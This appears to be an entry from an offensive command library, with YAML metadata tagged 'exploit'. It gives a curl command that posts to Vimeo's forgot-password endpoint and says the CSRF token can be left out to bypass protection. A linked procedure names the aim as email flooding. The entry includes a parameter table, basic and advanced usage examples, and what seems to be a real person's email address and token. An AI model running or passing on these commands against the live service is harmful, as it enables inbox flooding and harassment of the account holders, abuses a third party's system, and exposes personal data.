---
id: 123e4567-e89b-12d3-a456-426614174002
name: vimeo-forgot-password-post
type: command
executor: bash
data: >-
  curl -X POST https://vimeo.com/forgot_password -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "email=shubhamgupta109.1995%40gmail.com&token=e9b0179d3dd45669bd6d44a2484fb0f5.0"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:22.741Z'
platforms:
  - Web
  - Linux
  - macOS
tags:
  - csrf
  - web
  - exploit
verified: false
validated: true
submitted: true
---

# vimeo-forgot-password-post

## Command

```bash
curl -X POST https://vimeo.com/forgot_password -H "Content-Type: application/x-www-form-urlencoded" -d "email=shubhamgupta109.1995%40gmail.com&token=e9b0179d3dd45669bd6d44a2484fb0f5.0"
```

## Description

This command submits a POST request to Vimeo's forgot password endpoint, including the target email and CSRF token, to trigger a password reset email. It is used to test or exploit the CSRF bypass by optionally omitting the token parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Content-Type: application/x-www-form-urlencoded"` | Sets the content type for form data | Yes |
| `-d "email=..."` | Email address to send reset to (URL-encoded) | Yes |
| `-d "token=..."` | CSRF token (can be omitted for bypass) | No |

## Examples

### Basic Usage

```bash
curl -X POST https://vimeo.com/forgot_password -H "Content-Type: application/x-www-form-urlencoded" -d "email=test@example.com"
```

### Advanced Usage

```bash
curl -X POST https://vimeo.com/forgot_password -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: xsrft=tokenvalue" -d "email=test@example.com&token=tokenvalue"
```

## Expected Output

HTTP response with 200 OK or redirect to success page; password reset email sent to the specified address. If token is omitted and bypass works, no error occurs.

## Related

- [[Related Procedure|procedures/Exploit-Vimeo-CSRF-Bypass-for-Email-Flooding]]
